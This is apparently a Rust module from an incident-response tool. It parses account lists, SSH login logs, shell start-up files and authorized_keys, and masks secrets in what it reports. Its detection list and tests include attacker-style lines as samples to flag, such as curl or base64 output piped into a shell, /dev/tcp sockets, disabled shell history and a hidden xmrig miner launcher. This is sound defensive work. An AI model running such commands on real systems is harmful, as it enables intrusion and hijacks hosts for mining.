//! Evidence collection, pure part: reading `/etc/passwd`, SSH login lines and
//! shell start-up files. No file is opened here, so it is all tested directly;
//! `evidence` does the reading.
//!
//! Everything parsed here comes from a machine that may be compromised, so the
//! results are bounded and cut short, and nothing is ever executed or expanded.

use std::net::IpAddr;

use sha2::{Digest, Sha256};
use snsec_common::schema::{EvLogin, EvPersist, EvUser};

pub const MAX_USERS: usize = 50;
pub const MAX_LOGINS: usize = 30;
const LINE_MAX: usize = 240;

/// Shells that mean "this account cannot log in".
fn is_login_shell(shell: &str) -> bool {
    let s = shell.trim();
    !s.is_empty()
        && !s.ends_with("/nologin")
        && !s.ends_with("/false")
        && !s.ends_with("/sync")
        && !s.ends_with("/shutdown")
        && !s.ends_with("/halt")
        && !s.ends_with("/noshell")
}

/// Accounts a person (or an intruder) can log into: a login shell and a UID in
/// the regular-user range. `root` and system accounts are left out: they are
/// context the model does not need, and never a target.
#[must_use]
pub fn parse_passwd(text: &str, uid_min: u32) -> Vec<EvUser> {
    let mut out = Vec::new();
    for line in text.lines() {
        let f: Vec<&str> = line.split(':').collect();
        if f.len() < 7 {
            continue;
        }
        let Ok(uid) = f[2].parse::<u32>() else {
            continue;
        };
        if uid < uid_min.max(1) || uid == 65534 || !is_login_shell(f[6]) {
            continue;
        }
        out.push(EvUser {
            name: f[0].to_string(),
            uid,
            home: f[5].to_string(),
            shell: f[6].trim().to_string(),
            admin: false,
        });
        if out.len() >= MAX_USERS {
            break;
        }
    }
    out
}

/// `UID_MIN` from `/etc/login.defs` (the first regular account), default 1000.
#[must_use]
pub fn parse_uid_min(login_defs: &str) -> u32 {
    login_defs
        .lines()
        .filter_map(|l| {
            let l = l.trim();
            if l.starts_with('#') {
                return None;
            }
            let mut t = l.split_whitespace();
            (t.next()? == "UID_MIN").then(|| t.next()?.parse::<u32>().ok())?
        })
        .next()
        .unwrap_or(1000)
}

/// Accounts that can administer the machine: members of `sudo`, `wheel`, `admin`
/// or `adm`, by the group's member list or as their primary group.
#[must_use]
pub fn admin_accounts(passwd: &str, group: &str) -> std::collections::HashSet<String> {
    const ADMIN_GROUPS: &[&str] = &["sudo", "wheel", "admin", "adm"];
    let mut names = std::collections::HashSet::new();
    let mut gids = std::collections::HashSet::new();
    for l in group.lines() {
        let f: Vec<&str> = l.split(':').collect();
        if f.len() < 4 || !ADMIN_GROUPS.contains(&f[0]) {
            continue;
        }
        gids.insert(f[2].to_string());
        names.extend(
            f[3].split(',')
                .filter(|m| !m.is_empty())
                .map(str::to_string),
        );
    }
    for l in passwd.lines() {
        let f: Vec<&str> = l.split(':').collect();
        if f.len() >= 4 && gids.contains(f[3]) {
            names.insert(f[0].to_string());
        }
    }
    names
}

/// Does a process name look like a kernel thread (`kworker/0:1`, `[kworker/0:1Z]`)?
/// Real kernel threads have no executable; a process that has one and still wears
/// such a name is disguised.
#[must_use]
pub fn looks_like_kthread(comm: &str) -> bool {
    let c = comm.trim_matches(['[', ']']);
    comm.starts_with('[')
        || [
            "kworker/",
            "ksoftirqd/",
            "migration/",
            "rcu_",
            "watchdog/",
            "kthreadd",
            "kswapd",
            "khugepaged",
            "kcompactd",
            "jbd2/",
        ]
        .iter()
        .any(|p| c.starts_with(p))
}

/// `line` after its first `n` words.
fn after_words(line: &str, n: usize) -> Option<&str> {
    let mut rest = line.trim_start();
    for _ in 0..n {
        let end = rest.find(char::is_whitespace)?;
        rest = rest[end..].trim_start();
    }
    Some(rest)
}

/// The text of an sshd log line after sshd's own tag (`sshd[123]: `, `sshd: `, or
/// `sshd-session[123]: ` from OpenSSH 9.8 on). The tag must be the syslog program
/// field, right after the time stamp and the host name: a tag-like word later in
/// the line (a user name sshd copied, another program's message) is message text.
fn sshd_message(line: &str) -> Option<&str> {
    // An ISO time stamp is one word, a classic one (`Oct 12 02:11:33`) three.
    let stamp = if line.trim_start().starts_with(|c: char| c.is_ascii_digit()) {
        1
    } else {
        3
    };
    let (tag, msg) = after_words(line, stamp + 1)?.split_once(": ")?;
    let program = match tag.strip_suffix(']') {
        Some(t) => {
            let (name, pid) = t.split_once('[')?;
            if pid.is_empty() || !pid.bytes().all(|b| b.is_ascii_digit()) {
                return None;
            }
            name
        }
        None => tag,
    };
    matches!(program, "sshd" | "sshd-session").then_some(msg)
}

/// A successful SSH login, read strictly: sshd's own tag, then exactly
/// `Accepted <method> for <user> from <ip> port <n>`, then nothing but ` ssh2` and
/// `: <key>`. Returns (method, user, address). The evidence list and the never-ban
/// whitelist both read logins through this, and nothing else.
#[must_use]
pub fn accepted_login(line: &str) -> Option<(&str, &str, IpAddr)> {
    let tail = sshd_message(line)?.strip_prefix("Accepted ")?;
    let mut t = tail.splitn(7, ' ');
    let (method, for_, user, from, ip, port_kw, rest) = (
        t.next()?,
        t.next()?,
        t.next()?,
        t.next()?,
        t.next()?,
        t.next()?,
        t.next()?,
    );
    if method.is_empty() || for_ != "for" || user.is_empty() || from != "from" || port_kw != "port"
    {
        return None;
    }
    let ip = ip.parse::<IpAddr>().ok()?;
    let (port, after) = rest.split_once(' ').unwrap_or((rest, ""));
    port.parse::<u16>().ok()?;
    let after = after.strip_prefix("ssh2").unwrap_or(after);
    (after.is_empty() || after.starts_with(": ")).then_some((method, user, ip))
}

/// Words whose value is a secret when written `word=value`.
const SECRET_KEYS: &[&str] = &[
    "password", "passwd", "pass", "pwd", "token", "secret", "apikey", "api_key", "api-key", "auth",
    "key",
];

/// Programs whose password is the argument of a bare short flag:
/// `sshpass -p PW`, `redis-cli -a PW`, `openssl enc -k PW`.
const PASSWORD_FLAGS: &[(&str, &str)] =
    &[("sshpass", "-p"), ("redis-cli", "-a"), ("openssl", "-k")];

const QUOTES: [char; 2] = ['\'', '"'];

/// A header (or `name:value` word) whose value is a secret: `Authorization`,
/// `Cookie`, `X-Api-Key`, `X-Auth-Token`, openssl's `pass:`.
fn secret_name(name: &str) -> bool {
    let n = name.to_ascii_lowercase();
    !n.is_empty()
        && n.bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
        && (n == "cookie"
            || ["auth", "key", "token", "secret", "pass"]
                .iter()
                .any(|k| n.contains(k)))
}

/// The scheme word of an `Authorization` value, which comes before the secret.
fn is_auth_scheme(word: &str) -> bool {
    matches!(
        word.trim_matches(QUOTES).to_ascii_lowercase().as_str(),
        "basic" | "bearer" | "digest" | "token"
    )
}

/// `***` in place of a word, keeping the quotes around it so the line still
/// reads as it was written.
fn masked(tok: &str) -> String {
    let inner = tok.trim_matches(QUOTES);
    if inner.is_empty() {
        return tok.to_string();
    }
    let lead = tok.len() - tok.trim_start_matches(QUOTES).len();
    let trail = tok.trim_end_matches(QUOTES).len();
    format!("{}***{}", &tok[..lead], &tok[trail..])
}

/// `user:pass` or `user,pass` (lftp) with the part after the separator masked.
fn user_pass(tok: &str) -> String {
    match tok.find([':', ',']) {
        Some(i) if i + 1 < tok.trim_end_matches(QUOTES).len() => {
            format!("{}{}", &tok[..=i], masked(&tok[i + 1..]))
        }
        _ => tok.to_string(),
    }
}

/// A Telegram-style bot token in a URL path (`/bot123456:AAH.../sendMessage`).
fn mask_bot_token(tok: &str) -> std::borrow::Cow<'_, str> {
    if let Some(i) = tok.find("/bot") {
        let after = &tok[i + 4..];
        let digits = after.bytes().take_while(u8::is_ascii_digit).count();
        if digits > 0 && after[digits..].starts_with(':') {
            let secret = &after[digits + 1..];
            let end = secret.find(['/', '?', '\'', '"']).unwrap_or(secret.len());
            if end > 0 {
                return format!(
                    "{}/bot{}:***{}",
                    &tok[..i],
                    &after[..digits],
                    &secret[end..]
                )
                .into();
            }
        }
    }
    tok.into()
}

/// Mask the secrets that are commonly typed on a command line or written in a
/// shell file: `password=…`, `--token=…`, `-pSECRET` (mysql style), `-u user:pass`,
/// `https://user:pass@host`, the word after `Bearer`, `Basic` or `--password`,
/// secret header values (`Authorization:`, `X-Api-Key:`), openssl's `pass:…`,
/// `sshpass -p`, `redis-cli -a`, and a bot token in a URL.
/// A best effort: it cannot know every convention, so the text it returns may
/// still contain a secret, and the UI says so.
#[must_use]
pub fn redact(s: &str) -> String {
    let mut out: Vec<String> = Vec::new();
    let mut mask_next = false;
    let mut user_next = false;
    // The password flag of the last program named that takes one, until used.
    let mut tool_flag: Option<&str> = None;
    for raw in s.split(' ') {
        // Two spaces in a row are an empty word: it is not the value.
        if raw.is_empty() {
            out.push(String::new());
            continue;
        }
        let tok = mask_bot_token(raw);
        let tok = tok.as_ref();
        let lower = tok.to_ascii_lowercase();
        let bare = lower.trim_matches(QUOTES);
        if mask_next {
            mask_next = false;
            // `Authorization: Basic xyz`: the scheme stays, the credential goes.
            if is_auth_scheme(bare) {
                mask_next = true;
                out.push(tok.to_string());
            } else {
                out.push(masked(tok));
            }
            continue;
        }
        if user_next {
            user_next = false;
            out.push(user_pass(tok));
            continue;
        }
        // The flag alone, or with the value attached where the program takes
        // that (`sshpass -pSECRET`; openssl's `-keyout` is another option).
        if let Some(flag) = tool_flag
            && let Some(rest) = tok.strip_prefix(flag)
            && (rest.is_empty() || flag == "-p")
        {
            tool_flag = None;
            if rest.is_empty() {
                mask_next = true;
                out.push(tok.to_string());
            } else {
                out.push(format!("{flag}***"));
            }
            continue;
        }
        // The program's own name: `/usr/bin/redis-cli`, `command="redis-cli`.
        let program = bare.rsplit(['/', '=', '"', '\'']).next();
        if let Some((_, flag)) = PASSWORD_FLAGS.iter().find(|(p, _)| program == Some(*p)) {
            tool_flag = Some(flag);
        }
        // scheme://user:pass@host
        if let Some(i) = tok.find("://")
            && let Some(at) = tok[i + 3..].find('@')
        {
            let userinfo = &tok[i + 3..i + 3 + at];
            if let Some((u, _)) = userinfo.split_once(':') {
                out.push(format!("{}{u}:***{}", &tok[..i + 3], &tok[i + 3 + at..]));
                continue;
            }
        }
        // key=value with a secret-looking key; --user=name:pass
        if let Some(eq) = lower.find('=') {
            let key = lower[..eq].trim_start_matches('-');
            if SECRET_KEYS.iter().any(|k| key.ends_with(k)) {
                out.push(format!("{}=***", &tok[..eq]));
                continue;
            }
            if key == "user" {
                out.push(format!("{}={}", &tok[..eq], user_pass(&tok[eq + 1..])));
                continue;
            }
        }
        // `Authorization:` / `X-Api-Key:` as its own word: the value follows.
        if let Some(name) = bare.strip_suffix(':')
            && secret_name(name)
        {
            mask_next = true;
            out.push(tok.to_string());
            continue;
        }
        // `X-Api-Key:abc`, `pass:secret` (openssl) in one word.
        if let Some((name, value)) = tok.trim_start_matches(QUOTES).split_once(':')
            && !value.trim_matches(QUOTES).is_empty()
            && secret_name(name)
        {
            if is_auth_scheme(value) {
                mask_next = true;
                out.push(tok.to_string());
            } else {
                let cut_at = tok.len() - value.len();
                out.push(format!("{}{}", &tok[..cut_at], masked(value)));
            }
            continue;
        }
        match lower.as_str() {
            "--password" | "--passwd" | "--pass" | "--token" | "--secret" | "--api-key"
            | "--apikey" | "bearer" | "basic" => {
                mask_next = true;
                out.push(tok.to_string());
                continue;
            }
            "-u" | "--user" => {
                user_next = true;
                out.push(tok.to_string());
                continue;
            }
            _ => {}
        }
        // curl -uadmin:secret
        if tok.len() > 2 && tok.starts_with("-u") && tok.contains([':', ',']) {
            out.push(format!("-u{}", user_pass(&tok[2..])));
            continue;
        }
        // mysql -pSECRET (but not ssh -p2222: a port is all digits)
        if tok.starts_with("-p") && tok.len() > 2 && !tok[2..].chars().all(|c| c.is_ascii_digit()) {
            out.push("-p***".into());
            continue;
        }
        out.push(tok.to_string());
    }
    out.join(" ")
}

/// A login name usable on a command line without any surprise.
#[must_use]
pub fn is_safe_username(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 32
        && name
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '_' | '-' | '.'))
        && !name.starts_with('-')
}

fn cut(s: &str, max: usize) -> String {
    let s: String = s
        .chars()
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect();
    match s.char_indices().nth(max) {
        Some((i, _)) => s[..i].to_string(),
        None => s,
    }
}

/// SHA-256 (hex) of a line with surrounding whitespace removed.
#[must_use]
pub fn line_sha(line: &str) -> String {
    hex::encode(Sha256::digest(line.trim().as_bytes()))
}

/// The hash a line is identified by in the evidence: of the line with its secrets
/// masked, like the text shipped next to it. A hash of the raw line would let
/// anyone holding the evidence test guesses at a password written in it. The
/// agent hashes the live line the same way before it edits it.
#[must_use]
pub fn redacted_line_sha(line: &str) -> String {
    line_sha(&redact(line.trim()))
}

/// Why a shell start-up line deserves a look, or `None` for an ordinary one.
/// Comments are never suspicious. These are hints for the model and the
/// operator, not verdicts: `nohup` or `/tmp/` can be innocent.
#[must_use]
pub fn suspicious_rc_line(line: &str) -> Option<&'static str> {
    let l = line.trim();
    if l.is_empty() || l.starts_with('#') {
        return None;
    }
    let lower = l.to_ascii_lowercase();
    const HINTS: &[(&str, &str)] = &[
        (
            "/dev/shm",
            "runs or references /dev/shm (memory-backed temp dir)",
        ),
        ("/dev/tcp/", "opens a network socket from the shell"),
        ("base64 -d", "decodes base64 and runs it"),
        ("base64 --decode", "decodes base64 and runs it"),
        ("| sh", "pipes into a shell"),
        ("|sh", "pipes into a shell"),
        ("| bash", "pipes into a shell"),
        ("|bash", "pipes into a shell"),
        ("curl ", "downloads from the network"),
        ("wget ", "downloads from the network"),
        ("nohup ", "starts a detached background program"),
        ("chmod +x", "makes a file executable"),
        ("/var/tmp/", "runs or references a temp dir"),
        ("/tmp/", "runs or references a temp dir"),
        (".local/.", "runs a program from a hidden directory"),
        ("histfile=/dev/null", "hides shell history"),
        ("unset histfile", "hides shell history"),
    ];
    HINTS
        .iter()
        .find(|(needle, _)| lower.contains(needle))
        .map(|(_, why)| *why)
}

/// The suspicious lines of one shell start-up file as persistence entries.
/// `kind` is `shell_rc`. At most `max` are returned.
#[must_use]
pub fn scan_rc(text: &str, path: &str, user: &str, max: usize) -> Vec<EvPersist> {
    let mut out = Vec::new();
    for (i, line) in text.lines().enumerate().take(20_000) {
        let Some(reason) = suspicious_rc_line(line) else {
            continue;
        };
        out.push(EvPersist {
            kind: "shell_rc".into(),
            path: path.to_string(),
            user: user.to_string(),
            line_no: u32::try_from(i + 1).unwrap_or(u32::MAX),
            line: cut(&redact(line.trim()), LINE_MAX),
            sha256: redacted_line_sha(line),
            reason: reason.to_string(),
        });
        if out.len() >= max {
            break;
        }
    }
    out
}

/// `authorized_keys` entries without the key itself (long, and not useful to a
/// reader): the key type, any options, and the comment. The hash covers the whole
/// (redacted) line, key included, so it still identifies it.
#[must_use]
pub fn scan_authorized_keys(text: &str, path: &str, user: &str, max: usize) -> Vec<EvPersist> {
    let mut out = Vec::new();
    for (i, line) in text.lines().enumerate().take(2_000) {
        let l = line.trim();
        if l.is_empty() || l.starts_with('#') {
            continue;
        }
        // options? type KEY comment — drop the base64 blob (the longest token).
        let shown: Vec<&str> = l
            .split_whitespace()
            .filter(|t| t.len() < 100 || t.starts_with("command=") || t.starts_with("from="))
            .collect();
        let has_options =
            l.starts_with("command=") || l.starts_with("from=") || l.starts_with("no-");
        out.push(EvPersist {
            kind: "authorized_keys".into(),
            path: path.to_string(),
            user: user.to_string(),
            line_no: u32::try_from(i + 1).unwrap_or(u32::MAX),
            line: cut(&redact(&shown.join(" ")), LINE_MAX),
            sha256: redacted_line_sha(l),
            reason: if has_options {
                "key with forced command or source restriction".into()
            } else {
                "SSH key that can log in as this user".into()
            },
        });
        if out.len() >= max {
            break;
        }
    }
    out
}

// ---------------------------------------------------------------------------
// SSH logins
// ---------------------------------------------------------------------------

/// The time stamp at the start of an auth-log line: ISO (`2026-10-12T02:11:33...`)
/// or classic syslog (`Oct 12 02:11:33`).
fn log_time(line: &str) -> String {
    let mut it = line.split_whitespace();
    let first = it.next().unwrap_or("");
    if first.starts_with(|c: char| c.is_ascii_digit()) {
        return cut(first, 32);
    }
    let rest: Vec<&str> = std::iter::once(first).chain(it.take(2)).collect();
    cut(&rest.join(" "), 32)
}

/// Successful logins, oldest first, from the text of an auth log
/// (`Accepted password for alice from 203.0.113.5 port 5555 ssh2`). Only the last
/// `MAX_LOGINS` are kept.
#[must_use]
pub fn parse_ssh_logins(text: &str) -> Vec<EvLogin> {
    let mut out: Vec<EvLogin> = Vec::new();
    for line in text.lines() {
        // Matching "Accepted " anywhere in the line would let someone forge a
        // login by giving the server a user name that spells one out: sshd logs
        // that name verbatim after "Invalid user" or "Failed password for".
        let Some((method, user, ip)) = accepted_login(line) else {
            continue;
        };
        let entry = EvLogin {
            user: cut(user, 40),
            ip: ip.to_string(),
            method: cut(method, 24),
            when: log_time(line),
        };
        // A burst of the same login adds nothing.
        if out
            .last()
            .is_some_and(|p| p.user == entry.user && p.ip == entry.ip && p.method == entry.method)
        {
            if let Some(last) = out.last_mut() {
                last.when = entry.when;
            }
            continue;
        }
        out.push(entry);
    }
    let skip = out.len().saturating_sub(MAX_LOGINS);
    out.split_off(skip)
}

// ---------------------------------------------------------------------------
// Files
// ---------------------------------------------------------------------------

/// Does this start like a compiled Linux program (ELF)?
#[must_use]
pub fn is_elf(head: &[u8]) -> bool {
    head.starts_with(&[0x7f, b'E', b'L', b'F'])
}

/// Directories under a home whose contents are large and ordinary: not walked.
#[must_use]
pub fn skip_home_dir(name: &str) -> bool {
    matches!(
        name,
        ".cache"
            | ".npm"
            | ".composer"
            | ".git"
            | ".cpanel"
            | ".softaculous"
            | ".nvm"
            | ".cargo"
            | ".rustup"
            | ".wp-cli"
            | "node_modules"
            | "public_html"
            | "domains"
            | "mail"
            | "Maildir"
            | "tmp"
            | "logs"
            | "backups"
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn only_regular_login_accounts_are_listed() {
        let passwd = "root:x:0:0:root:/root:/bin/bash\n\
                      daemon:x:1:1::/usr/sbin:/usr/sbin/nologin\n\
                      tnttravel:x:1004:1004::/home/tnttravel:/bin/bash\n\
                      shop:x:1005:1005::/home/shop:/bin/false\n\
                      nobody:x:65534:65534::/nonexistent:/bin/bash\n\
                      dev:x:1006:1006::/home/dev:/bin/zsh\n\
                      broken line\n";
        let u = parse_passwd(passwd, 1000);
        let names: Vec<&str> = u.iter().map(|x| x.name.as_str()).collect();
        assert_eq!(names, ["tnttravel", "dev"]);
        assert_eq!(u[0].home, "/home/tnttravel");
        assert_eq!(u[0].shell, "/bin/bash");
    }

    #[test]
    fn the_user_list_is_bounded() {
        let many: String = (0..200)
            .map(|i| format!("u{i}:x:{}:{}::/home/u{i}:/bin/bash\n", 2000 + i, 2000 + i))
            .collect();
        assert_eq!(parse_passwd(&many, 1000).len(), MAX_USERS);
    }

    #[test]
    fn user_names_that_could_confuse_a_command_line_are_refused() {
        assert!(is_safe_username("tnttravel"));
        assert!(is_safe_username("user.name_1-x"));
        for bad in ["", "-rf", "a b", "a;b", "A", "$(x)", &"a".repeat(33)] {
            assert!(!is_safe_username(bad), "{bad}");
        }
    }

    #[test]
    fn the_hidden_miner_launcher_is_flagged_and_ordinary_lines_are_not() {
        assert!(suspicious_rc_line("nohup ~/.local/.ps >/dev/null 2>&1 &").is_some());
        assert!(suspicious_rc_line("curl -s http://x/y.sh | sh").is_some());
        assert!(suspicious_rc_line("/dev/shm/.k/xmrig -o pool:80").is_some());
        assert!(suspicious_rc_line("echo aGk= | base64 -d | bash").is_some());
        assert!(suspicious_rc_line("export HISTFILE=/dev/null").is_some());
        for ok in [
            "export PATH=$HOME/bin:$PATH",
            "alias ll='ls -la'",
            "# nohup ~/.local/.ps",
            "   ",
            "if [ -f ~/.bashrc ]; then . ~/.bashrc; fi",
        ] {
            assert!(suspicious_rc_line(ok).is_none(), "{ok}");
        }
    }

    #[test]
    fn rc_entries_carry_line_number_hash_and_cut_text() {
        let text = format!(
            "# hi\nexport A=1\nnohup ~/.local/.ps &\n{}\n",
            "curl ".to_string() + &"x".repeat(500)
        );
        let e = scan_rc(&text, "/home/u/.bashrc", "u", 10);
        assert_eq!(e.len(), 2);
        assert_eq!(e[0].line_no, 3);
        assert_eq!(e[0].kind, "shell_rc");
        assert_eq!(e[0].sha256, line_sha("nohup ~/.local/.ps &"));
        assert_eq!(e[0].sha256, line_sha("   nohup ~/.local/.ps &   "));
        assert_eq!(e[1].line_no, 4);
        assert!(e[1].line.chars().count() <= LINE_MAX);
        // The cap holds.
        assert_eq!(scan_rc(&text, "/p", "u", 1).len(), 1);
    }

    #[test]
    fn authorized_keys_are_listed_without_the_key_blob() {
        let blob = "A".repeat(380);
        let text = format!(
            "# comment\nssh-ed25519 {blob} admin@laptop\ncommand=\"/bin/x\" ssh-rsa {blob} backdoor\n"
        );
        let e = scan_authorized_keys(&text, "/home/u/.ssh/authorized_keys", "u", 10);
        assert_eq!(e.len(), 2);
        assert!(e[0].line.contains("ssh-ed25519") && e[0].line.contains("admin@laptop"));
        assert!(!e[0].line.contains(&blob));
        assert_eq!(e[0].line_no, 2);
        assert_eq!(e[1].line_no, 3);
        assert_eq!(e[0].sha256.len(), 64);
    }

    #[test]
    fn successful_logins_are_read_and_failures_ignored() {
        let log = "Oct 12 02:11:33 host sshd[1]: Failed password for root from 9.9.9.9 port 1 ssh2\n\
                   Oct 12 02:11:40 host sshd[1]: Accepted password for tnttravel from 1.95.183.155 port 5555 ssh2\n\
                   2026-10-12T03:00:00+07:00 host sshd[2]: Accepted publickey for admin from 203.0.113.9 port 22 ssh2: ED25519 SHA256:x\n\
                   Oct 12 04:00:00 host sshd[3]: Accepted password for bad from not-an-ip port 1 ssh2\n";
        let l = parse_ssh_logins(log);
        assert_eq!(l.len(), 2);
        assert_eq!(
            (l[0].user.as_str(), l[0].ip.as_str(), l[0].method.as_str()),
            ("tnttravel", "1.95.183.155", "password")
        );
        assert_eq!(l[0].when, "Oct 12 02:11:40");
        assert_eq!(l[1].method, "publickey");
        assert!(l[1].when.starts_with("2026-10-12T03:00:00"));
    }

    #[test]
    fn a_forged_login_in_a_user_name_is_not_a_login() {
        // sshd logs the name a client supplied verbatim; one that spells out an
        // "Accepted ..." message must not be read as a successful login.
        let log = "Oct 12 02:00:00 h sshd[1]: Failed password for invalid user Accepted password for admin from 1.2.3.4 port 22 ssh2 from 9.9.9.9 port 5 ssh2\n\
                   Oct 12 02:00:01 h sshd[1]: Invalid user x: Accepted publickey for admin from 5.6.7.8 port 1 ssh2 from 9.9.9.9 port 5\n\
                   Oct 12 02:00:02 h sshd[2]: Accepted publickey for real from 203.0.113.7 port 1 ssh2\n\
                   Oct 12 02:00:03 h sshd: Accepted password for plain from 203.0.113.8 port 1 ssh2\n";
        let l = parse_ssh_logins(log);
        let who: Vec<&str> = l.iter().map(|x| x.user.as_str()).collect();
        assert_eq!(who, ["real", "plain"], "{l:?}");
    }

    #[test]
    fn a_burst_of_one_login_is_one_entry_and_only_the_latest_are_kept() {
        let burst: String = (0..50)
            .map(|i| format!("Oct 12 02:{i:02}:00 h sshd[1]: Accepted password for a from 1.2.3.4 port {i} ssh2\n"))
            .collect();
        let l = parse_ssh_logins(&burst);
        assert_eq!(l.len(), 1);
        assert_eq!(l[0].when, "Oct 12 02:49:00");

        let many: String = (0..100)
            .map(|i| format!("Oct 12 02:00:00 h sshd[1]: Accepted password for u{i} from 1.2.3.{} port 1 ssh2\n", i % 250 + 1))
            .collect();
        let l = parse_ssh_logins(&many);
        assert_eq!(l.len(), MAX_LOGINS);
        assert_eq!(l.last().unwrap().user, "u99");
    }

    #[test]
    fn elf_magic_and_skipped_directories() {
        assert!(is_elf(&[0x7f, b'E', b'L', b'F', 2, 1]));
        assert!(!is_elf(b"#!/bin/sh"));
        assert!(!is_elf(&[]));
        assert!(skip_home_dir(".cache") && skip_home_dir("public_html"));
        assert!(!skip_home_dir(".local") && !skip_home_dir(".ps"));
    }
}

#[cfg(test)]
mod hardening_tests {
    use super::*;

    #[test]
    fn secrets_typed_on_a_command_line_are_masked() {
        for (given, must_not_contain) in [
            ("mysql -u root -pHunter2 -e 'select 1'", "Hunter2"),
            ("curl -u admin:s3cret https://x/y", "s3cret"),
            ("curl https://bob:pw123@host/path", "pw123"),
            ("app --password hunter2 --verbose", "hunter2"),
            ("app --token=abc123def", "abc123def"),
            ("DB_PASSWORD=topsecret ./run", "topsecret"),
            (
                "curl -H Authorization: Bearer eyJhbGciOi.xyz https://x",
                "eyJhbGciOi",
            ),
            ("export API_KEY=sk-live-999", "sk-live-999"),
        ] {
            let r = redact(given);
            assert!(!r.contains(must_not_contain), "{given} -> {r}");
            assert!(r.contains("***"), "{given} -> {r}");
        }
    }

    #[test]
    fn ordinary_command_lines_survive_redaction_unchanged() {
        for s in [
            "/usr/bin/php-fpm: pool www",
            "ssh -p 2222 host",
            "ssh -p2222 host",
            "nohup ~/.local/.ps >/dev/null 2>&1 &",
            "/dev/shm/.k/xmrig -o 103.194.186.150:80 --donate-level 1",
        ] {
            assert_eq!(redact(s), s);
        }
    }

    #[test]
    fn the_hash_is_of_the_redacted_line_so_it_cannot_confirm_a_guessed_secret() {
        let raw = "curl -u a:hunter2 http://h/x.sh | sh";
        let text = format!("echo hi\n  {raw}  \n");
        let e = scan_rc(&text, "/home/u/.bashrc", "u", 5);
        assert_eq!(e.len(), 1);
        assert!(!e[0].line.contains("hunter2"), "{}", e[0].line);
        assert_eq!(e[0].sha256, line_sha("curl -u a:*** http://h/x.sh | sh"));
        assert_eq!(e[0].sha256, redacted_line_sha(raw));
        assert_ne!(e[0].sha256, line_sha(raw));
        // A guess at the secret hashes the same as any other: nothing to confirm.
        assert_eq!(
            redacted_line_sha("curl -u a:guess http://h/x.sh | sh"),
            e[0].sha256
        );
        // A line with nothing to mask hashes as before.
        assert_eq!(redacted_line_sha(" nohup x & "), line_sha("nohup x &"));
        // authorized_keys entries are hashed the same way.
        let k = scan_authorized_keys(
            "command=\"redis-cli -a s3cret ping\" ssh-ed25519 AAAA k\n",
            "/home/u/.ssh/authorized_keys",
            "u",
            5,
        );
        assert!(!k[0].line.contains("s3cret"), "{}", k[0].line);
        assert_eq!(
            k[0].sha256,
            redacted_line_sha("command=\"redis-cli -a s3cret ping\" ssh-ed25519 AAAA k")
        );
    }

    #[test]
    fn more_secret_forms_are_masked() {
        for (given, secret) in [
            ("sshpass -p 123456 ssh root@h", "123456"),
            ("sshpass -p1234 ssh root@h", "1234"),
            ("redis-cli -h 10.0.0.2 -a r3dispw ping", "r3dispw"),
            ("/usr/bin/redis-cli -a r3dispw", "r3dispw"),
            ("openssl enc -d -aes-256-cbc -k encpw -in x", "encpw"),
            ("openssl req -new -keyout k.pem -k encpw", "encpw"),
            ("openssl rsa -passin pass:keypw -in k.pem", "keypw"),
            (
                "curl -H 'Authorization: Basic dXNlcjpwYXNz' https://x",
                "dXNlcjpwYXNz",
            ),
            (
                "curl -H \"Authorization:Bearer tok123\" https://x",
                "tok123",
            ),
            ("curl -H 'X-Api-Key: abcdef' https://x", "abcdef"),
            ("curl -H X-Auth-Token:zzz999 https://x", "zzz999"),
            ("curl -H 'Cookie: session=s3ss' https://x", "s3ss"),
            ("curl -uadmin:s3cret https://x", "s3cret"),
            ("curl --user=admin:s3cret https://x", "s3cret"),
            ("lftp -u bob,ftppw ftp://h", "ftppw"),
            (
                "curl https://api.telegram.org/bot123456:AAHsecretTok/sendMessage",
                "AAHsecretTok",
            ),
            ("app --password  spaced", "spaced"),
        ] {
            let r = redact(given);
            assert!(!r.contains(secret), "{given} -> {r}");
            assert!(r.contains("***"), "{given} -> {r}");
        }
        // The quotes stay where they were.
        assert_eq!(
            redact("curl -H 'Authorization: Basic dXNlcjpwYXNz' https://x"),
            "curl -H 'Authorization: Basic ***' https://x"
        );
        assert_eq!(
            redact("curl https://api.telegram.org/bot12:AAH/sendMessage?chat_id=1"),
            "curl https://api.telegram.org/bot12:***/sendMessage?chat_id=1"
        );
        // Not a secret: the same flags on other programs, a pool address.
        for s in [
            "curl -a -k https://x",
            "ssh -p 22 h",
            "openssl x509 -in c.pem -noout",
            "openssl req -new -key k.pem -keyout x.pem",
            "xmrig -o stratum+tcp://pool.example:3333",
            "env:HOME",
        ] {
            assert_eq!(redact(s), s);
        }
    }

    #[test]
    fn a_login_is_read_only_from_sshds_own_program_field() {
        let ok = [
            "Oct 12 02:11:40 host sshd[1]: Accepted password for a from 1.2.3.4 port 5555 ssh2",
            "Oct  2 02:11:40 host sshd[1]: Accepted password for a from 1.2.3.4 port 5555 ssh2",
            "Oct 12 02:11:40 host sshd-session[77]: Accepted publickey for a from 2001:db8::1 port 22 ssh2: ED25519 SHA256:abc",
            "2026-10-12T03:00:00.123+07:00 host sshd-session[2]: Accepted keyboard-interactive/pam for a from 1.2.3.4 port 1 ssh2",
            "Oct 12 02:11:40 host sshd: Accepted password for a from 1.2.3.4 port 5555",
        ];
        for l in ok {
            assert!(accepted_login(l).is_some(), "{l}");
        }
        assert_eq!(
            accepted_login(ok[2]),
            Some(("publickey", "a", "2001:db8::1".parse().unwrap()))
        );
        let forged = [
            // Another authpriv program logging a name the client chose.
            "Oct 12 02:11:40 host vsftpd[3]: sshd[1]: Accepted password for a from 6.6.6.6 port 1 ssh2",
            "Oct 12 02:11:40 host su[3]: pam: sshd: Accepted password for a from 6.6.6.6 port 1 ssh2",
            // A tag that is not the program field.
            "Oct 12 02:11:40 sshd[1]: Accepted password for a from 6.6.6.6 port 1 ssh2",
            "Oct 12 02:11:40 host sshd-auth[1]: Accepted password for a from 6.6.6.6 port 1 ssh2",
            "Oct 12 02:11:40 host sshd[x]: Accepted password for a from 6.6.6.6 port 1 ssh2",
            // Not the exact shape.
            "Oct 12 02:11:40 host sshd[1]: Accepted password for a from 6.6.6.6",
            "Oct 12 02:11:40 host sshd[1]: Accepted password for a from 6.6.6.6 port x ssh2",
